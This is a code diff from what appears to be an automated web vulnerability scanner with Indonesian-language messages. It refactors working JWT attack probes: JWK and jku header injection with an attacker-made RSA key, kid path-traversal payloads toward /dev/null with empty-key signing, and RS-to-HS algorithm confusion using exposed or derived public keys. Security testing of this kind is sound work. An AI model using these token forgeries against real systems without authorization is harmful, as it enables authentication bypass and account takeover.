                     from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
-                    from cryptography.hazmat.primitives import serialization as _ser
-                    import jwt as pyjwt
-                    priv = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
-                    nums = priv.public_key().public_numbers()
-
-                    import base64
+                    from cryptography.hazmat.primitives import serialization as _serialization
+                    import base64 as _base64
+                    private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                    numbers = private_key.public_key().public_numbers()
 
                     def b64u_int(value: int) -> str:
                         raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
-                        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+                        return _base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
 
-                    jwk = {"kty": "RSA", "e": b64u_int(nums.e), "n": b64u_int(nums.n), "alg": "RS256"}
-                    h2 = dict(header)
-                    h2["alg"] = "RS256"
-                    h2["jwk"] = jwk
-                    h2.pop("kid", None)
-                    pem = priv.private_bytes(_ser.Encoding.PEM, _ser.PrivateFormat.PKCS8,
-                                             _ser.NoEncryption())
-                    forged = self._jwt_sign(h2, forged_payload, key=pem, alg="RS256")
-                    h3 = dict(header)
-                    h3["alg"] = "RS256"
-                    h3.pop("jwk", None)
-                    control = self._jwt_sign(h3, forged_payload, key=pem, alg="RS256")
-                    confirm(150, forged, "jwk header injection (kunci penyerang dipercaya)",
-                            "jwt_jwk_header_injection", control=control)
-                except Exception:
-                    pass
+                    injected_kid = "satria-" + uuid.uuid4().hex[:12]
+                    jwk = {
+                        "kty": "RSA", "e": b64u_int(numbers.e), "n": b64u_int(numbers.n),
+                        "alg": "RS256", "use": "sig", "kid": injected_kid,
+                    }
+                    forged_header = dict(header)
+                    forged_header.update({"alg": "RS256", "jwk": jwk, "kid": injected_kid})
+                    private_pem = private_key.private_bytes(
+                        _serialization.Encoding.PEM,
+                        _serialization.PrivateFormat.PKCS8,
+                        _serialization.NoEncryption(),
+                    )
+                    forged = self._jwt_sign(forged_header, forged_payload, key=private_pem, alg="RS256")
+                    control_header = dict(header)
+                    control_header.update({"alg": "RS256", "kid": injected_kid})
+                    control_header.pop("jwk", None)
+                    control = self._jwt_sign(control_header, forged_payload, key=private_pem, alg="RS256")
+                    confirm(
+                        150, forged, "server mempercayai JWK yang ditanam dalam header",
+                        "jwt_jwk_header_injection", control=control,
+                    )
+                except Exception as exc:
+                    self.stats["errors"].append(f"JWT JWK injection probe: {type(exc).__name__}")
 
-            # 151 jku header injection: JWK penyerang harus dapat diambil server dari URL same-origin
+            # 151: jku injection requires a real same-origin JSON resource containing
+            # the attacker's JWKS. Only reflected JSON responses are eligible; a
+            # textual HTML reflection is not a usable key set.
             if 151 not in self._confirmed and self._within_budget():
                 try:
                     from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
-                    from cryptography.hazmat.primitives import serialization as _ser
+                    from cryptography.hazmat.primitives import serialization as _serialization
                     from urllib.parse import quote as _quote
-                    import jwt as pyjwt
-                    priv = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
-                    nums = priv.public_key().public_numbers()
+                    import base64 as _base64
 
-                    import base64
+                    private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                    numbers = private_key.public_key().public_numbers()
 
                     def b64u_int(value: int) -> str:
                         raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
-                        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+                        return _base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
 
-                    jwk = {"kty": "RSA", "kid": "satria", "use": "sig", "alg": "RS256",
-                           "e": b64u_int(nums.e), "n": b64u_int(nums.n)}
-                    jwks_text = json.dumps({"keys": [jwk]})
+                    injected_kid = "satria-jku-" + uuid.uuid4().hex[:10]
+                    jwk = {
+                        "kty": "RSA", "kid": injected_kid, "use": "sig", "alg": "RS256",
+                        "e": b64u_int(numbers.e), "n": b64u_int(numbers.n),
+                    }
+                    jwks_text = json.dumps({"keys": [jwk]}, separators=(",", ":"))
                     jku_url = None
-                    for point in points[:10]:
-                        if getattr(point, "kind", "") != "query" or not getattr(point, "name", ""):
-                            continue
-                        sep = "&" if "?" in (point.url or "") else "?"
-                        probe = f"{point.url}{sep}{point.name}={_quote(jwks_text, safe='')}"
-                        r = self._request("GET", probe, allow_redirects=True)
-                        if r.error or not r.text:
-                            continue
-                        if jwk["n"] in r.text and "keys" in r.text:
-                            jku_url = probe
+                    reflected_points = [
+                        point for point in points[:80]
+                        if getattr(point, "kind", "") == "query"
+                        and getattr(point, "name", "")
+                        and self._same_origin(getattr(point, "url", "") or "")
+                    ]
+                    for point in reflected_points[:12]:
+                        if not self._within_budget():
                             break
+                        separator = "&" if "?" in point.url else "?"
+                        probe_url = (
+                            f"{point.url}{separator}{point.name}="
+                            f"{_quote(jwks_text, safe='')}"
+                        )
+                        response = self._request("GET", probe_url, allow_redirects=True)
+                        if response.error or response.status != 200:
+                            continue
+                        content_type = str((response.headers or {}).get("Content-Type", "")).lower()
+                        if "json" not in content_type:
+                            continue
+                        try:
+                            parsed = json.loads(response.text or "")
+                            keys = parsed.get("keys", []) if isinstance(parsed, dict) else []
+                        except Exception:
+                            continue
+                        if any(
+                            isinstance(key, dict) and key.get("kid") == injected_kid
+                            and key.get("n") == jwk["n"]
+                            for key in keys
+                        ):
+                            jku_url = probe_url
+                            break
+
                     if jku_url:
-                        h2 = dict(header)
-                        h2.update({"alg": "RS256", "jku": jku_url, "kid": "satria"})
-                        pem = priv.private_bytes(_ser.Encoding.PEM, _ser.PrivateFormat.PKCS8,
-                                                 _ser.NoEncryption())
-                        forged = self._jwt_sign(h2, forged_payload, key=pem, alg="RS256")
-                        h3 = dict(header)
-                        h3.update({"alg": "RS256", "kid": "satria"})
-                        h3.pop("jku", None)
-                        control = self._jwt_sign(h3, forged_payload, key=pem, alg="RS256")
-                        confirm(151, forged, f"jku injection menunjuk JWK same-origin ({jku_url})",
-                                "jwt_jku_header_injection", control=control)
-                except Exception:
-                    pass
+                        forged_header = dict(header)
+                        forged_header.update({"alg": "RS256", "jku": jku_url, "kid": injected_kid})
+                        private_pem = private_key.private_bytes(
+                            _serialization.Encoding.PEM,
+                            _serialization.PrivateFormat.PKCS8,
+                            _serialization.NoEncryption(),
+                        )
+                        forged = self._jwt_sign(forged_header, forged_payload, key=private_pem, alg="RS256")
+                        control_header = dict(header)
+                        control_header.update({"alg": "RS256", "kid": injected_kid})
+                        control_header.pop("jku", None)
+                        control = self._jwt_sign(control_header, forged_payload, key=private_pem, alg="RS256")
+                        confirm(
+                            151, forged, "server mengambil JWKS dari URL jku same-origin yang dapat dikendalikan",
+                            "jwt_jku_header_injection", control=control,
+                        )
+                except Exception as exc:
+                    self.stats["errors"].append(f"JWT JKU injection probe: {type(exc).__name__}")
 
-            # 152 kid path traversal -> /dev/null (kunci kosong)
+            # 152: kid path traversal, including the canonical /dev/null lab payload.
             if 152 not in self._confirmed and self._within_budget():
-                for kid in ("../../../../../../../dev/null", "/dev/null",
-                            "....//....//....//....//dev/null"):
-                    if 152 in self._confirmed:
+                kid_paths = (
+                    "../../../../../../../dev/null", "../../../../../../../../dev/null",
+                    "/dev/null", "....//....//....//....//dev/null",
+                    "..%2f..%2f..%2f..%2f..%2fdev%2fnull",
+                )
+                for kid_path in kid_paths:
+                    if 152 in self._confirmed or not self._within_budget():
                         break
-                    h2 = dict(header)
-                    h2.update({"kid": kid, "alg": "HS256"})
-                    forged = self._jwt_sign(h2, forged_payload, key=b"", alg="HS256")
-                    control = self._jwt_sign(h2, forged_payload, key=rand_key, alg="HS256")
-                    confirm(152, forged, f"kid path traversal {kid!r} (kunci kosong)",
-                            "jwt_kid_path_traversal", control=control)
+                    forged_header = dict(header)
+                    forged_header.update({"kid": kid_path, "alg": "HS256"})
+                    forged = self._jwt_sign(forged_header, forged_payload, key=b"", alg="HS256")
+                    control = self._jwt_sign(forged_header, forged_payload, key=random_key, alg="HS256")
+                    confirm(
+                        152, forged, f"kid mengarah ke file dengan isi kosong ({kid_path!r})",
+                        "jwt_kid_path_traversal", control=control,
+                    )
 
-            # 153 algorithm confusion RS->HS dengan public key terekspos
-            if 153 not in self._confirmed and self._within_budget():
-                pem_pair = None
-                for path in ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/api/jwks",
-                             "/oauth2/jwks", "/api/keys", "/public.pem", "/key.pem"):
-                    if pem_pair or not self._within_budget():
+            # Discover public keys from standard JWKS/PEM routes, links, and JS.
+            if 153 not in self._confirmed and self._within_budget() and algorithm.startswith("RS"):
+                public_key_candidates: list[str] = []
+                known_key_paths = (
+                    "/.well-known/jwks.json", "/jwks.json", "/jwks",
+                    "/api/jwks", "/api/v1/jwks", "/oauth2/jwks",
+                    "/oauth/jwks", "/openid-connect/certs", "/oauth2/certs",
+                    "/api/keys", "/auth/keys", "/public.pem", "/public-key.pem",
+                    "/public_key.pem", "/key.pem", "/rsa.public",
+                )
+                for page in pages[:60]:
+                    page_blob = (getattr(page, "text", "") or "") + "\n" + (getattr(page, "js_text", "") or "")
+                    for match in re.finditer(
+                        r"""(?i)["']([^"'\\s]{1,180}(?:jwks(?:\\.json)?|\\.pem|/certs|public[-_]key)[^"'\\s]{0,100})["']""",
+                        page_blob,
+                    ):
+                        value = match.group(1)
+                        if value.startswith("/"):
+                            candidate_url = urljoin(origin + "/", value.lstrip("/"))
+                        elif value.startswith("http") and self._same_origin(value):
+                            candidate_url = value
+                        else:
+                            continue
+                        if candidate_url not in public_key_candidates:
+                            public_key_candidates.append(candidate_url)
+                public_key_candidates = (
+                    [urljoin(origin + "/", path.lstrip("/")) for path in known_key_paths]
+                    + public_key_candidates
+                )
+                pem_variants: list[str] = []
+                for key_url in list(dict.fromkeys(public_key_candidates))[:20]:
+                    if 153 in self._confirmed or not self._within_budget():
                         break
-                    r = self._request("GET", urljoin(origin + "/", path.lstrip("/")), allow_redirects=True)
-                    if r.error or r.status != 200 or not r.text:
+                    if not self._same_origin(key_url):
                         continue
-                    body = r.text
+                    response = self._request("GET", key_url, allow_redirects=True)
+                    if response.error or response.status != 200 or not response.text:
+                        continue
+                    body = response.text
                     if "BEGIN PUBLIC KEY" in body or "BEGIN RSA PUBLIC KEY" in body:
-                        pem_pair = (body, body)
-                        break
+                        pem_match = re.search(
+                            r"-----BEGIN (?:RSA )?PUBLIC KEY-----.*?-----END (?:RSA )?PUBLIC KEY-----",
+                            body, re.S,
+                        )
+                        if pem_match:
+                            pem_variants.extend([pem_match.group(0), pem_match.group(0)])
+                            break
                     try:
-                        data = json.loads(body)
-                        keys = data.get("keys") or ([data] if "kty" in data else [])
+                        parsed = json.loads(body)
+                        keys = parsed.get("keys") or ([parsed] if "kty" in parsed else [])
                     except Exception:
                         continue
-                    for key in keys:
-                        if key.get("kty") != "RSA" or "n" not in key or "e" not in key:
+                    if not isinstance(keys, list):
+                        continue
+                    for jwk_key in keys:
+                        if not isinstance(jwk_key, dict) or jwk_key.get("kty") != "RSA":
+                            continue
+                        if not jwk_key.get("n") or not jwk_key.get("e"):
+                            continue
+                        original_kid = header.get("kid")
+                        if original_kid and jwk_key.get("kid") and original_kid != jwk_key.get("kid"):
                             continue
                         try:
                             from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
-                            from cryptography.hazmat.primitives import serialization as _ser
-
-                            import base64
+                            from cryptography.hazmat.primitives import serialization as _serialization
 
                             def b64u_to_int(value: str) -> int:
                                 value += "=" * (-len(value) % 4)
-                                return int.from_bytes(base64.urlsafe_b64decode(value.encode()), "big")
+                                return int.from_bytes(_base64.urlsafe_b64decode(value.encode()), "big")
 
-                            pub = _rsa.RSAPublicNumbers(b64u_to_int(key["e"]), b64u_to_int(key["n"])).public_key()
-                            x509 = pub.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
-                            pkcs1 = pub.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.PKCS1).decode()
-                            pem_pair = (x509, pkcs1)
-                            break
+                            public_key = _rsa.RSAPublicNumbers(
+                                b64u_to_int(jwk_key["e"]), b64u_to_int(jwk_key["n"])
+                            ).public_key()
+                            pem_variants.extend([
+                                public_key.public_bytes(
+                                    _serialization.Encoding.PEM,
+                                    _serialization.PublicFormat.SubjectPublicKeyInfo,
+                                ).decode(),
+                                public_key.public_bytes(
+                                    _serialization.Encoding.PEM,
+                                    _serialization.PublicFormat.PKCS1,
+                                ).decode(),
+                            ])
+                            if len(pem_variants) >= 2:
+                                break
                         except Exception:
                             continue
-                if pem_pair:
-                    h2 = dict(header)
-                    h2["alg"] = "HS256"
-                    for pem in pem_pair:
-                        if 153 in self._confirmed:
-                            break
-                        forged = self._jwt_sign(h2, forged_payload, key=pem, alg="HS256")
-                        control = self._jwt_sign(h2, forged_payload, key=rand_key, alg="HS256")
-                        confirm(153, forged, "algorithm confusion RS->HS memakai public key terekspos",
-                                "jwt_algorithm_confusion", control=control)
+                    if pem_variants:
+                        break
 
-            # 154 algorithm confusion tanpa public key: derivasi modulus dari dua token RS*
-            # hanya bila tidak ada teknik lain yang sudah terbukti (menghindari duplikasi & mahal)
-            if 154 not in self._confirmed and self._within_budget() and \
-               not any(n in self._confirmed for n in (150, 151, 153)) and "RS" in alg:
-                rs_tokens = [t for t, _l, _n in tokens if str(self._jwt_decode(t)["header"].get("alg", "")).upper().startswith("RS")]
-                if len(rs_tokens) < 2:
-                    fresh = self._jwt_login(pages)
-                    extra = self._jwt_collect_tokens(pages, fresh) if fresh is not None else []
-                    for t, _l, _n in extra:
-                        if t not in rs_tokens and str(self._jwt_decode(t)["header"].get("alg", "")).upper().startswith("RS"):
-                            rs_tokens.append(t)
-                if len(rs_tokens) >= 2:
-                    derived = self._jwt_rsa_pem_from_tokens(rs_tokens)
+                if pem_variants:
+                    for pem in list(dict.fromkeys(pem_variants))[:2]:
+                        if 153 in self._confirmed or not self._within_budget():
+                            break
+                        forged_header = dict(header)
+                        forged_header["alg"] = "HS256"
+                        forged = self._jwt_sign(forged_header, forged_payload, key=pem, alg="HS256")
+                        control = self._jwt_sign(forged_header, forged_payload, key=random_key, alg="HS256")
+                        confirm(
+                            153, forged, "alg RS->HS memakai public key server yang terekspos",
+                            "jwt_algorithm_confusion", control=control,
+                        )
+
+            # 154: derive a server RSA public key from two RS* tokens when no public
+            # key endpoint is exposed. Python's bigint fallback avoids gmpy2 dependency.
+            if (
+                154 not in self._confirmed and self._within_budget()
+                and not any(number in self._confirmed for number in (150, 151, 153))
+                and algorithm.startswith("RS")
+            ):
+                rsa_tokens = [
+                    candidate for candidate, _loc, _name in tokens
+                    if str((self._jwt_decode(candidate) or {}).get("header", {}).get("alg", "")).upper().startswith("RS")
+                ]
+                if len(rsa_tokens) < 2 and self._within_budget():
+                    fresh_session = self._jwt_login(pages)
+                    extra_tokens = self._jwt_collect_tokens(pages, fresh_session) if fresh_session else []
+                    for candidate, _loc, _name in extra_tokens:
+                        if candidate not in rsa_tokens and str(
+                            (self._jwt_decode(candidate) or {}).get("header", {}).get("alg", "")
+                        ).upper().startswith("RS"):
+                            rsa_tokens.append(candidate)
+                if len(rsa_tokens) >= 2:
+                    derived = self._jwt_rsa_pem_from_tokens(rsa_tokens[:3])
                     if derived:
-                        h2 = dict(header)
-                        h2["alg"] = "HS256"
                         for pem in derived:
-                            if 154 in self._confirmed:
+                            if 154 in self._confirmed or not self._within_budget():
                                 break
-                            forged = self._jwt_sign(h2, forged_payload, key=pem, alg="HS256")
-                            control = self._jwt_sign(h2, forged_payload, key=rand_key, alg="HS256")
-                            confirm(154, forged, "algorithm confusion RS->HS dengan modulus hasil derivasi dua token",
-                                    "jwt_algorithm_confusion_no_exposed_key", control=control)
+                            forged_header = dict(header)
+                            forged_header["alg"] = "HS256"
+                            forged = self._jwt_sign(forged_header, forged_payload, key=pem, alg="HS256")
+                            control = self._jwt_sign(forged_header, forged_payload, key=random_key, alg="HS256")
+                            confirm(
+                                154, forged, "alg RS->HS memakai modulus hasil derivasi token RS*",
+                                "jwt_algorithm_confusion_no_exposed_key", control=control,
+                            )
 
 
     # ======================== Access control vulnerabilities (155-167, bukti diferensial terverifikasi) ========================
